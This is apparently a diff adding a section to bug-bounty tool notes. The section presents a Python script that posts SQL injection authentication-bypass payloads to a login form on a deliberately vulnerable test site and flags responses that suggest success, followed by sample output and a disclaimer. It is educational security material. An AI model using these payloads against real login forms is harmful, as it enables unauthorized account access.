@@ -68,3 +68,62 @@ IP: 142.250.77.46
 **Bug bounty use case:** Resolve all subdomains from your subdomain 
 enumeration list to IPs. Any subdomain that resolves = live target worth 
 investigating further.
+
+Automated SQLi Auth Bypass Tester (sqli_tester.py)
+📝 Description
+This is a lightweight Python automation script designed to test web login forms for SQL Injection (SQLi) Authentication Bypass vulnerabilities. Instead of manually testing inputs via a browser, this tool utilizes the requests library to loop through a checklist of malicious payloads, submit them to a target backend form, and analyze the response to flag successful bypasses.
+
+🛠️ Core Concepts Covered
+Automated HTTP Requests: Uses requests.post() to simulate a user physically clicking "Log In" on a web form.
+
+Parameter Mapping: Binds malicious injection payloads directly to the backend form data elements (uname, pass, submit).
+
+Exception Handling: Implements a try/except block to catch connection drops or server timeouts without crashing the terminal.
+
+Response Analysis: Evaluates the server's HTML response (response.text) to dynamically identify if a login restriction was bypassed or if the database threw a syntax error.
+
+
+**Usage:**
+```
+import requests
+
+# 1. Target URL
+target_url = "http://testphp.vulnweb.com/userinfo.php"
+
+# 2. Our list of malicious SQL inputs (Payloads)
+payloads = ["' OR 1=1 -- -", "admin' --", "' OR '1'='1"]
+
+print("[*] Starting our automated login tester...")
+
+# 3. Loop through each payload automatically
+for payload in payloads:
+    
+    # Corrected form data matching the exact live site parameters
+    form_data = {
+        'uname': payload,
+        'pass': 'Password123',
+        'submit': 'login'  # We added the missing login button click!
+    }
+    
+    try:
+        # 4. Send the data to the website
+        response = requests.post(target_url, data=form_data)
+        
+        # 5. Check if the webpage contains a login failure message
+        if "wrong username or password" in response.text.lower():
+            print(f"[-] Payload failed: {payload}")
+        else:
+            print(f"[+] SUCCESS! Potential bypass found with payload: {payload}")
+            
+    except Exception as e:
+        print(f"[!] Connection error occurred: {e}")
+```
+
+Expected Output:
+[*] Starting our automated login tester...
+[-] Payload failed: ' OR 1=1 -- -
+[-] Payload failed: admin' --
+[+] SUCCESS! Potential bypass found with payload: ' OR '1'='1
+
+⚠️ Disclaimer
+This script is created exclusively for educational purposes and authorized penetration testing within laboratory environments (such as testphp.vulnweb.com). Unauthorized scanning of production infrastructure without prior written consent is strictly illegal.
